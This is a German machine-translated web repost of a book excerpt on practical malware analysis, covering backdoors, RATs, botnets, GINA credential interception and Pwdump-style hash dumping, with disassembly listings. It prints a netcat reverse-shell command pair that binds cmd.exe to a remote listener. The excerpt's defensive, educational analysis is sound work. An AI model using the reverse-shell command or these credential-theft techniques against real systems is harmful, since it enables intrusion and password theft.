<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üìñ üñêüèª ü§ì Das Buch "Eine Autopsie wird zeigen!" Praktische Malware-Analyse ¬ª üßïüèª üï∫üèº üïî</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Die Malware-Analyse √§hnelt einem Katz- und Mausspiel: Keine Regeln, die Situation √§ndert sich st√§ndig. Daher ist es in diesem Fall sinnvoll, nur zeitl...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Das Buch "Eine Autopsie wird zeigen!" Praktische Malware-Analyse ¬ª</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/piter/blog/416143/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><img src="https://habrastorage.org/webt/jk/0g/rv/jk0grvjx0tqi91gqj9v6qmsqahs.jpeg" align="left" alt="Bild"></a>  Die Malware-Analyse √§hnelt einem Katz- und Mausspiel: Keine Regeln, die Situation √§ndert sich st√§ndig.  Daher ist es in diesem Fall sinnvoll, nur zeitlose Dinge und Algorithmen zu untersuchen.  Sobald Sie vor der Aufgabe stehen, das Netzwerk (oder tausend Netzwerke) zu sch√ºtzen, fahren Sie mit einer solchen Analyse fort, und Sie k√∂nnen einfach nicht auf dieses Buch verzichten. <br><br><h3>  Programme zum Herunterladen und Ausf√ºhren von Software </h3><br>  Es gibt zwei Arten von h√§ufig auftretender Malware, die zum Herunterladen und Ausf√ºhren von Software entwickelt wurde.  Downloader (nicht zu verwechseln mit System-Downloadern) laden einfach zus√§tzlichen Schadcode aus dem Internet herunter und f√ºhren ihn auf einem lokalen Computer aus.  Sie werden oft zusammen mit dem Exploit verteilt.  Sie verwenden normalerweise zwei Windows-API-Aufrufe nacheinander, um zus√§tzliche Malware herunterzuladen und auszuf√ºhren: URLDownloadtoFileA und WinExec. <br><a name="habracut"></a><br>  Launcher (Launcher) ist eine ausf√ºhrbare Datei, die sch√§dliche Anwendungen f√ºr ihre versteckte Ausf√ºhrung installiert (sofort oder nach einiger Zeit).  Starter werden h√§ufig mit der Software geliefert, die sie zum Ausf√ºhren ben√∂tigen.  Wir werden sie in Kapitel 12 diskutieren. <br><br><h4>  Hintert√ºren </h4><br>  Hintert√ºren sind Programme, mit denen ein Angreifer auf den Computer eines Opfers zugreifen kann.  Sie sind die am besten erkennbare Art von Malware, und ihre Gr√∂√üe und ihr Funktionsumfang k√∂nnen erheblich variieren.  Der Backdoor-Code ist normalerweise in sich geschlossen und erfordert kein Herunterladen zus√§tzlicher infizierter Dateien. <br><br>  Backdoors interagieren auf viele verschiedene Arten √ºber das Internet, aber Daten werden normalerweise √ºber HTTP √ºber Port 80 √ºbertragen. HTTP macht den gr√∂√üten Teil des ausgehenden Netzwerkverkehrs aus, was Malware eine gro√üartige M√∂glichkeit bietet, vor dem Hintergrund anderer Informationen unbemerkt zu bleiben. <br><br>  In Kapitel 14 erfahren Sie, wie Sie Backdoors auf Paketebene analysieren und effektive Netzwerksignaturen erstellen.  In der Zwischenzeit werden wir uns auf die Interaktion auf hoher Ebene konzentrieren. <br>  Backdoors verf√ºgen √ºber eine Reihe von Standardfunktionen: Sie k√∂nnen Registrierungsschl√ºssel bearbeiten, die angezeigten Fenster z√§hlen, Verzeichnisse erstellen, nach Dateien suchen usw. Um zu verstehen, welche davon von der Backdoor verwendet werden, k√∂nnen Sie √ºberpr√ºfen, welche Windows-API-Funktionen importiert werden.  Anhang A enth√§lt eine Liste allgemeiner Funktionen, die beschreiben, was sie √ºber die Malware sagen k√∂nnen. <br><br><h3>  Reverse Command Shell </h3><br>  Eine Reverse Command Shell ist eine Verbindung, die einen infizierten Computer initiiert und einem Angreifer Befehlszugriff gew√§hrt.  Es kann sich entweder um ein separates Schadprogramm oder um eine der Komponenten einer komplexeren Hintert√ºr handeln.  In der Reverse-Command-Shell kann ein Angreifer Befehle ausf√ºhren, als ob dies alles auf seinem lokalen System geschehen w√§re. <br><br><h4>  Netcat Reverse Command Shell </h4><br>  Das in Kapitel 3 beschriebene Netcat-Programm kann zum Erstellen einer Befehlsshell verwendet werden, wenn Sie es auf zwei Computern ausf√ºhren.  Angreifer verwenden es h√§ufig selbst und erg√§nzen es mit anderer Malware. <br>  Um Netcat als solches zu verwenden, muss das Remote-System mit dem folgenden Befehl auf eingehende Verbindungen warten: <br><br><pre><code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nc</span></span> -l ‚Äìp <span class="hljs-number"><span class="hljs-number">80</span></span></code> </pre> <br>  Der Schalter -l schaltet Netcat in den Abh√∂rmodus und der Schalter -p bestimmt den zu √ºberwachenden Port.  Als n√§chstes initiiert der Computer des Opfers eine ausgehende Verbindung und stellt seine Befehlsshell bereit: <br><br><pre> <code class="hljs dos">nc _ip <span class="hljs-number"><span class="hljs-number">80</span></span> -e <span class="hljs-built_in"><span class="hljs-built_in">cmd</span></span>.exe</code> </pre> <br>  IP 80 Listener ist die IP-Adresse und der Port des Remote-Hosts.  Mit der Option -e k√∂nnen Sie das Programm angeben, das ausgef√ºhrt wird, wenn die Verbindung hergestellt wird.  Die Standardeingabe und -ausgabe wird an den Socket gebunden (wie Sie sp√§ter sehen werden, verwendet Windows h√§ufig cmd.exe). <br><br><h4>  Windows Reverse Shell </h4><br>  Angreifer verwenden in Windows zwei einfache cmd.exe-basierte Reverse-Command-Shell-Implementierungen: Basic und Multithreaded. <br><br>  Die grundlegende Methode ist bei Malware-Autoren beliebt, da sie einfacher zu implementieren ist und im Allgemeinen nicht schlechter funktioniert als ein Multithread-Ansatz.  Es basiert auf dem Aufruf von CreateProcess und dem √Ñndern der STARTUPINFO-Struktur, die an das Programm √ºbergeben wird.  Zun√§chst wird ein Socket erstellt und eine Verbindung zum Remote-Server hergestellt.  Dieser Socket wird dann an die Standard-Threads (Eingabe, Ausgabe und Fehlerstrom) des Prozesses cmd.exe angeh√§ngt.  CreateProcess f√ºhrt cmd.exe im fensterlosen Modus aus, um es vor dem Opfer zu verbergen.  Kapitel 7 gibt ein Beispiel f√ºr diese Technik. <br><br>  Eine Multithread-Version der Windows-Reverse-Befehlsshell impliziert das Erstellen eines Sockets, zweier Pipes und zweier Threads (daher sollten Sie nach CreateThread- und CreatePipe-Aufrufen suchen).  Diese Methode wird manchmal von Malware-Autoren als Teil einer Strategie zum √Ñndern oder Codieren von Daten verwendet, die √ºber einen Socket √ºbertragen werden.  Die CreatePipe-Funktion kann verwendet werden, um an die Lese- und Schreibenden des Kanals zu binden, z. B. Standardeingabe (stdin) und Standardeingabe (stdout).  Mit der CreateProcess-Funktion k√∂nnen Sie Standard-Threads an einen Kanal und nicht direkt an einen Socket binden.  Nach dem Aufruf erstellt die Malware zwei Ausf√ºhrungsthreads: einen zum Lesen aus dem Standard-Kanal und zum Schreiben in den Socket und einen zum Lesen aus dem Socket und zum Schreiben in den Standard-Kanal.  In der Regel handelt es sich bei diesen Threads um Codierungsdaten, die in Kapitel 13 erl√§utert werden. Mithilfe von Reverse Engineering-Methoden k√∂nnen Sie die Zweige untersuchen, in denen die Streams w√§hrend einer verschl√ºsselten Sitzung empfangene Pakete decodieren. <br><br><h3>  Tools f√ºr die Remoteverwaltung </h3><br>  Remote Administration Tools (RATs) werden verwendet, um einen Computer oder Computer √ºber ein Netzwerk zu steuern.  Sie sind h√§ufig an eng gezielten Angriffen beteiligt - beispielsweise beim Diebstahl von Informationen oder beim Wechsel von Computer zu Computer. <br><br>  In Abb.  11.1 zeigt die Netzwerkstruktur der RAT.  Der auf dem System des Opfers ausgef√ºhrte Server ist mit Schadcode ausgestattet.  Der Client arbeitet remote, da das Steuermodul dem Angreifer zur Verf√ºgung steht.  Die Server signalisieren dem Client, der sie steuert, die Verbindung herzustellen.  Die Zusammenarbeit in RAT erfolgt normalerweise √ºber Standardports wie 80 oder 443. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/kj/7f/px/kj7fpxqhevkd2db817n4rjulxuu.png" alt="Bild"></div><br><h3>  Botnets </h3><br>  Ein Botnetz ist eine Sammlung infizierter Netzwerkknoten (Zombies), die zentral verwaltet werden und normalerweise √ºber einen Server namens Botnet-Controller verwaltet werden.  Ziel des Botnetzes ist es, so viele Computer wie m√∂glich zu infizieren und darauf basierend ein gro√ües Netzwerk zu erstellen, das sowohl zur Verbreitung anderer Malware oder Spam als auch zur Durchf√ºhrung von DDoS-Angriffen (Distributed Denial-of-Service) verwendet werden kann. )  Wenn alle Zombies gleichzeitig anfangen, eine bestimmte Site anzugreifen, kann dies unzug√§nglich werden. <br><br><h3>  Vergleich von RAT und Botnetzen </h3><br>  Es gibt mehrere wichtige Unterschiede zwischen Botnetzen und Remoteverwaltungstools. <br><br><ul><li>  Es ist bekannt, dass Botnetze Millionen von Knoten infizieren und kontrollieren.  RATs werden normalerweise von weit weniger Computern ausgef√ºhrt. </li><li>  Alle Botnet-Teilnehmer werden gleichzeitig verwaltet.  Mit RAT k√∂nnen Sie Ressourcen auf verschiedene Opfer verteilen, da ein Angreifer enger mit infizierten Systemen interagieren kann. </li><li>  RATs werden bei eng gezielten Angriffen eingesetzt, w√§hrend Botnets f√ºr ihre enorme Anzahl bekannt sind. </li></ul><br><h3>  Diebstahl von Anmeldeinformationen </h3><br>  Angreifer gehen oft zu allen m√∂glichen Tricks, um Anmeldeinformationen zu stehlen.  Dies gilt insbesondere f√ºr die drei Arten von Malware. <br><br><ul><li>  Programme, die Benutzeranmeldeinformationen stehlen, sobald er sich beim System anmeldet. </li><li>  Programme, die in Windows gespeicherte Informationen (Kennw√∂rter, Hashes usw.) zur direkten Verwendung oder weiteren Entschl√ºsselung kopieren. </li><li>  Programme, die Tastenanschl√§ge aufzeichnen. </li></ul><br>  In diesem Abschnitt betrachten wir jede dieser Arten von Malware. <br><br><h3>  GINA Interception </h3><br>  Windows XP verwendet einen Trick zum Stehlen von Anmeldeinformationen, der darin besteht, GINA abzufangen (grafische Identifizierung und Authentifizierung).  Das GINA-System wurde entwickelt, um es Drittanbieteranwendungen zu erm√∂glichen, den Anmeldevorgang f√ºr sich selbst anzupassen, und bietet Unterst√ºtzung f√ºr Technologien wie die Radiofrequenzidentifikation (RFID) auf der Basis von Token oder Smartcards.  Malware-Autoren nutzen diese Gelegenheit, um Code herunterzuladen, der Anmeldeinformationen stiehlt. <br><br>  GINA ist als DLL mit dem Namen msgina.dll implementiert und wird bei der Anmeldung von Winlogon geladen.  Winlogon unterst√ºtzt auch Plugins von Drittanbietern, die vor der GINA-DLL geladen werden (wie bei einem Zwischenangriff).  Zur Vereinfachung bietet Windows den folgenden Registrierungszweig, in dem Winlogon DLLs von Drittanbietern finden und laden kann: <br><br><pre> <code class="hljs tex">HKLM<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SOFTWARE</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Microsoft</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Windows</span></span></span></span> NT<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">CurrentVersion</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Winlogon</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">GinaDLL</span></span></span></span></code> </pre> <br>  Einmal fanden wir dort eine infizierte Datei fsgina.dll, die sich als GINA-Abfangj√§ger herausstellte. <br>  In Abb.  Abbildung 11.2 zeigt ein Beispiel daf√ºr, wie Anmeldeinformationen in eine sch√§dliche Bibliothek gelangen und von Winlogon an msgina.dll √ºbergeben werden.  Die Malware (fsgina.dll) kann alle Anmeldeinformationen abfangen, die der Benutzer w√§hrend der Authentifizierung eingibt.  Er kann es auf die Festplatte schreiben oder √ºber das Netzwerk √ºbertragen. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ge/eh/ma/geehmaneqdvfmxkmq9-8drvs5cc.png" alt="Bild"></div><br>  Da die Bibliothek fsgina.dll den Interaktionsfluss zwischen Winlogon und GINA abf√§ngt, muss sie weiter an msgina.dll √ºbergeben werden, damit das System weiterhin normal funktioniert.  Dazu muss die Malware alle Funktionen exportieren, die das GINA-System ben√∂tigt - es gibt mehr als 15 davon, und die meisten haben das Pr√§fix Wlx.  Wenn Sie in der DLL viele Exportfunktionen finden, die mit Wlx beginnen, k√∂nnen Sie nat√ºrlich davon ausgehen, dass dies ein GINA-Interceptor ist. <br><br>  Die meisten dieser Exportaufrufe greifen auf reale Funktionen in msgina.dll zu.  Im Fall von fsgina.dll gilt dies f√ºr alle Funktionen au√üer WlxLoggedOutSAS.  Listing 11.1 zeigt den Export von WlxLoggedOutSAS nach fsgina.dll. <br><br>  Listing 11.1.  WlxLoggedOutSAS-Exportfunktion in der GINA-DLL, die gestohlene Anmeldeinformationen aufzeichnet <br><br><pre> <code class="hljs powershell"><span class="hljs-number"><span class="hljs-number">100014</span></span>A0 WlxLoggedOutSAS <span class="hljs-number"><span class="hljs-number">100014</span></span>A0 push esi <span class="hljs-number"><span class="hljs-number">100014</span></span>A1 push edi <span class="hljs-number"><span class="hljs-number">100014</span></span>A2 push offset aWlxloggedout_0 ; <span class="hljs-string"><span class="hljs-string">"WlxLoggedOutSAS"</span></span> <span class="hljs-number"><span class="hljs-number">100014</span></span>A7 call Call_msgina_dll_<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(1)</span></span></span><span class="hljs-function"> ... </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FB</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">eax</span></span></span><span class="hljs-function"> ; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Args</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FC</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aUSDSPSOpS</span></span></span><span class="hljs-function"> ;"</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">U</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">D</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">P</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">OP</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001501</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aDRIVERS</span></span></span><span class="hljs-function"> ; "</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">drivers</span></span></span><span class="hljs-function">\</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">tcpudp</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sys</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001503</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">call</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Log_To_File</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(2)</span></span></span></span></code> </pre> <br>  Anmeldeinformationen werden sofort mithilfe eines als Call_msgina_dll_function (1) bezeichneten Aufrufs in die Datei msgina.dll √ºbertragen.  Diese Funktion sucht dynamisch den WlxLoggedOutSAS-Aufruf von msgina.dll, der als Argument angegeben wird, und startet ihn.  Ein Anruf in Leitung (2) zeichnet Daten auf.  Als Argumente werden Buchhaltungsinformationen, eine Formatzeichenfolge, mit der diese Informationen angezeigt werden, und ein Dateiname f√ºr die Aufzeichnung verwendet.  Infolgedessen werden Informationen zu einer erfolgreichen Anmeldung in der Datei% SystemRoot% \ system32 \ drivers \ tcpudp.sys gespeichert.  Diese Datei enth√§lt den Benutzernamen, die Domain und zwei Passw√∂rter - das aktuelle und das alte. <br><br><h3>  Hashes speichern </h3><br>  Sch√§dliche Software unter Windows speichert h√§ufig System-Hashes, um Zugriff auf Anmeldeinformationen zu erhalten.  Nach dem Speichern versuchen die Angreifer, diese Hashes offline zu entschl√ºsseln oder verwenden sie, um wie Pass-the-Hash anzugreifen.  W√§hrend dieses Angriffs werden LM- und NTLM-Hashes f√ºr die Remote-NTLM-Authentifizierung verwendet, f√ºr die keine Entschl√ºsselung und kein entsprechendes Kennwort erforderlich ist. <br><br>  Um die Hashes zu speichern, gibt es kostenlose Softwarepakete f√ºr Pwdump und Pass-the-Hash (PSH).  Da beide Tools Open Source sind, wurde auf ihrer Basis viel Malware erstellt. <br><br>  Die meisten Virenschutzprogramme haben Signaturen f√ºr die kompilierten Standardversionen dieser Dienstprogramme. Daher versuchen Angreifer h√§ufig, ihre eigenen Variationen zu kompilieren, um eine Erkennung zu vermeiden.  Die Beispiele in diesem Kapitel sind die Arten von pwdump und PSH, auf die wir im wirklichen Leben gesto√üen sind. <br><br>  Pwdump ist eine Reihe von Programmen, die Hashes im LM i NTLM-Format ausgeben, die lokalen Benutzern vom Security Account Manager (SAM) geh√∂ren.  Pwdump f√ºgt die DLL in den LSASS-Prozess (Subsystemdienst der lokalen Sicherheitsbeh√∂rde) ein, besser bekannt als lsass.exe.  Wir werden die Implementierung von DLLs in Kapitel 12 diskutieren, aber im Moment m√ºssen Sie nur wissen, dass dies eine Technik ist, mit der Malware Bibliotheken in anderen Prozessen unter Verwendung aller ihrer Berechtigungen ausf√ºhrt.  Tools zum Speichern von Hashes greifen h√§ufig den Prozess lsass.exe an, da er √ºber ausreichende Berechtigungen und Zugriff auf viele n√ºtzliche API-Funktionen verf√ºgt. <br><br>  Die Standardversion von Pwdump verwendet die Bibliothek lsaext.dll.  Wenn es in lsass.exe eingef√ºgt wird, ruft es die GetHash-Funktion auf, die aus lsaext.dll exportiert wird, um die Hashes abzurufen.  In diesem Fall werden undokumentierte Windows-Funktionen verwendet, mit denen Sie die Seriennummern aller Benutzer im System und unverschl√ºsselte Hashes des Kennworts f√ºr jeden von ihnen abrufen k√∂nnen. <br><br>  Angesichts der Variation von Pwdump m√ºssen Sie seine Bibliotheken analysieren, um zu verstehen, wie Hashes gespeichert werden.  Als erstes sollten Sie auf Exportfunktionen achten.  Der GetHash-Aufruf wird standardm√§√üig aus Pwdump exportiert, aber Angreifer k√∂nnen seinen Namen leicht √§ndern, um ihn weniger erkennbar zu machen.  Dann sollten Sie versuchen, die Funktionen zu bestimmen, die in Exportaufrufen verwendet werden.  Viele von ihnen k√∂nnen dynamisch lokalisiert werden. Daher verwenden Exportaufrufe die GetProcAddress-Operation h√§ufig wieder. <br><br>  Listing 11.2 zeigt den GrabHash-Exportfunktionscode aus der DLL einer Version von Pwdump.  Da die Bibliothek in lsass.exe eingebettet ist, muss sie vor der Verwendung vieler Zeichen zun√§chst im manuellen Modus gefunden werden. <br><br>  Listing 11.2.  Einzigartige API-Aufrufe, die von der GrabHash-Exportfunktion in einer der Pwdump-Varianten verwendet werden <br><br><pre> <code class="hljs perl"><span class="hljs-number"><span class="hljs-number">1000123</span></span>F <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset LibFileName ; <span class="hljs-string"><span class="hljs-string">"samsrv.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-number"><span class="hljs-number">10001244</span></span> call esi ; LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001248</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aAdvapi32_dll_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"advapi32.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">2</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001251</span></span> call esi ; LoadLibraryA ... <span class="hljs-number"><span class="hljs-number">1000125</span></span>B <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset ProcName ; <span class="hljs-string"><span class="hljs-string">"SamIConnect"</span></span> <span class="hljs-number"><span class="hljs-number">10001260</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">10001265</span></span> call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">10001281</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamrqu ; <span class="hljs-string"><span class="hljs-string">"SamrQueryInformationUser"</span></span> <span class="hljs-number"><span class="hljs-number">10001286</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">1000128</span></span>C call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>C2 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamigetpriv ; <span class="hljs-string"><span class="hljs-string">"SamIGetPrivateData"</span></span> <span class="hljs-number"><span class="hljs-number">100012</span></span>C7 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>CD call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>CF <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuncti ; <span class="hljs-string"><span class="hljs-string">"SystemFunction025"</span></span> (<span class="hljs-number"><span class="hljs-number">3</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>D4 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>DA call esi ; GetProcAddress <span class="hljs-number"><span class="hljs-number">100012</span></span>DC <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuni_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"SystemFunction027"</span></span> (<span class="hljs-number"><span class="hljs-number">4</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>E1 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>E7 call esi ; GetProcAddress</code> </pre> <br>  Listing 11.2 zeigt den Code zum Abrufen der Bibliotheksdeskriptoren samsrv.dll (1) und advapi32.dll (2) durch Aufrufen von LoadLibrary.  Die Datei samsrv.dll enth√§lt eine API f√ºr den einfachen Zugriff auf SAM, und die Datei advapi32.dll wurde gefunden, um auf Funktionen zuzugreifen, die nicht in lsass.exe importiert wurden.  Die dynamische Bibliothek dieser Variante Pwdump verwendet die Deskriptoren dieser Bibliotheken, um nach vielen Funktionen zu suchen.  Die f√ºnf wichtigsten werden in der Liste angezeigt (beachten Sie die GetProcAddress-Aufrufe und ihre Argumente). <br><br>  Interessante Aufrufe wie SamIConnect, SamrQueryInformationUser und SamIGetPrivateData werden aus samsrv.dll importiert.  Der SamIConnect-Aufruf wird anschlie√üend verwendet, um eine Verbindung zu SAM herzustellen. Anschlie√üend wird die SamrQueryInformationUser-Funktion f√ºr jeden Benutzer im System aufgerufen. <br><br>  Die Hashes werden mit dem Aufruf SamIGetPrivateData abgerufen und anschlie√üend mit den aus advapi32.dll (Zeilen (2) und (3)) importierten Funktionen SystemFunction025 und SystemFunction027 entschl√ºsselt.  Keine der API-Funktionen in dieser Liste ist in der offiziellen Dokumentation beschrieben. <br><br>  Das PSH-Toolkit enth√§lt Programme, die Hash-Dumps erstellen.  Die beliebteste dieser Deponien ist als whosthere-alt bekannt.  Es speichert SAM-Inhalte, die durch Einbetten der DLL in lsass.exe erhalten wurden.  Gleichzeitig wird im Vergleich zu Pwdump ein v√∂llig anderer Satz von API-Funktionen verwendet.  Listing 11.3 zeigt den Versionscode f√ºr whosthere-alt, der eine Funktion namens TestDump exportiert. <br><br>  Listing 11.3.  Eindeutige API-Aufrufe, die von der Exportfunktion TestDump der whosthere-alt-Version verwendet werden <br><br><pre> <code class="hljs sql">10001119 push offset LibFileName ; "secur32.dll" 1000111E <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001130</span></span> push <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> ProcName ; "LsaEnumerateLogonSessions" 10001135 push esi ; hModule 10001136 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetProcAddress (<span class="hljs-number"><span class="hljs-number">1</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001670</span></span> <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetSystemDirectoryA <span class="hljs-number"><span class="hljs-number">10001676</span></span> mov edi, <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> aMsv1_0_dll ; \\msv1_0.dll ... 100016A6 push eax ; path to msv1_0.dll 100016A9 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetModuleHandleA (<span class="hljs-number"><span class="hljs-number">2</span></span>)</code> </pre> <br>  Da diese Bibliothek in lsass.exe eingebettet ist, erstellt ihre TestDump-Funktion einen Hash-Dump.  Es l√§dt dynamisch die Datei secur32.dll und findet den Aufruf LsaEnumerateLogonSessions (1) darin, um eine Liste lokal eindeutiger Bezeichner (LUIDs) abzurufen.  Diese Liste enth√§lt die Namen und Dom√§nen, die bei jeder Anmeldung angegeben wurden.  Die Bibliothek durchsucht sie, um Zugriff auf Buchhaltungsinformationen zu erhalten.  Zu diesem Zweck sucht sie mithilfe eines Aufrufs von GetModuleHandle (2) in msv1_0.dll nach einer nicht exportierten Funktion, NlpGetPrimaryCredential, die das Speichern von NT- und LM-Hashes erm√∂glicht. <br><br><h3>  √úber Autoren </h3><br>  <b>Michael Sikorski</b> ist Sicherheitsspezialist bei Mandiant.  Er ist im Rahmen einer Vorfalluntersuchung an der Malware-Analyse beteiligt und ber√§t die US-Regierung im Bereich Informationssicherheit.  Michael hat eine Reihe von Kursen zur Malware-Analyse entwickelt und unterrichtet sie einem vielf√§ltigen Publikum, darunter dem FBI und Black Hat.  Vor Mandiant war er Mitarbeiter des Lincoln Laboratory am Massachusetts Institute of Technology und forschte √ºber passive Netzwerktopologie und Penetrationstests.  Dar√ºber hinaus absolvierte Michael ein dreij√§hriges interdisziplin√§res Schulungsprogramm zu Systemen und Netzwerken bei der NSA.  W√§hrend der Ausbildung nahm er am Studium der Reverse Engineering-Techniken teil und erhielt mehrere Auszeichnungen im Bereich der Netzwerkanalyse. <br><br>  <b>Andrew Honig</b> ist Experte f√ºr Informationssicherheit im US-Verteidigungsministerium.  Er unterrichtet Softwareanalyse, Reverse Engineering und Programmierung f√ºr das Windows-Betriebssystem (OS) an der National School of Cryptography und ist zertifizierter Sicherheitsspezialist f√ºr Informationssysteme.  Aufgrund von Andrew mehrere Zero-Day-Exploits f√ºr die 